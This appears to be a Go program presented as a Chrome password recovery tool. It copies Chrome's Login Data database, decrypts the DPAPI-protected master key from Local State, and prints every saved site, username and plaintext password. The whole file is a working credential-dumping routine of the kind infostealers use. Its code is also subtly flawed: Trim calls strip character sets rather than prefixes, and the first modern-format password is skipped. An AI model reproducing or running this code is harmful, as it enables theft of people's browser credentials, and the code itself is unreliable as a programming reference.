//Chrome Password Recovery project main.go
//Recover Websites, Username and Passwords from Google Chromes Login Data file.

//Windows Only

//SQLLite3 - github.com/mattn/go-sqlite3
//Using Crypt32.dll (win32crypt) for decryption

//C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default

package main

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"os"
	"syscall"
	"unsafe"
	"strings"
	"encoding/json"
	"io/ioutil"
	"encoding/base64"
	"crypto/aes"
	"crypto/cipher"
	_ "github.com/mattn/go-sqlite3"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	masterKey []byte 
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}


func getMasterKey() ([]byte,error){

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
	    return masterKey,err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
	    return masterKey,err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)// It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey) 
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.
	
	masterKey,err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil{
		return masterKey,err
	}

	return masterKey,nil

}

func main() {
	//Check for Login Data file
	if !checkFileExist(dataPath) {
		os.Exit(0)
	}

	
	//Copy Login Data file to temp location
	err := copyFileToDirectory(dataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}


	//Open Database
	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	//Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var URL string
		var USERNAME string
		var PASSWORD string

		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
		if err != nil {
			log.Fatal(err)
		}
		//Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10"){ // Means it's chrome 80 or higher
			PASSWORD = strings.Trim(PASSWORD, "v10") 

			//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
			if string(masterKey) != ""{
				ciphertext := []byte(PASSWORD)
				c, err := aes.NewCipher(masterKey)
			    if err != nil {
			    	
			        fmt.Println(err)
			    }
			    gcm, err := cipher.NewGCM(c)
			    if err != nil {
			        fmt.Println(err)
			    }
			    nonceSize := gcm.NonceSize()
			    if len(ciphertext) < nonceSize {
			        fmt.Println(err)
			    }

			    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
			    if err != nil {
			        fmt.Println(err)
			    }
			    if string(plaintext) != ""{
			    	fmt.Println(URL," | ", USERNAME," | ", string(plaintext))
			    	//fmt.Println(URL," | ", USERNAME," | ", "**DEMO**")

			    }
			}else{ // It the masterkey hasn't been requested yet, then gets it.
				mkey,err := getMasterKey()
				if err != nil{
					fmt.Println(err)
				}
				masterKey = mkey
			}
		}else{ //Means it's chrome v. < 80
			pass, err := Decrypt([]byte(PASSWORD))
			if err != nil {
				log.Fatal(err)
			}

			if URL != "" && URL != "" && string(pass) != "" {
				fmt.Println(URL, USERNAME, string(pass))
			}
		}

		
		//Check if no value, if none skip
		
	}
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}

}
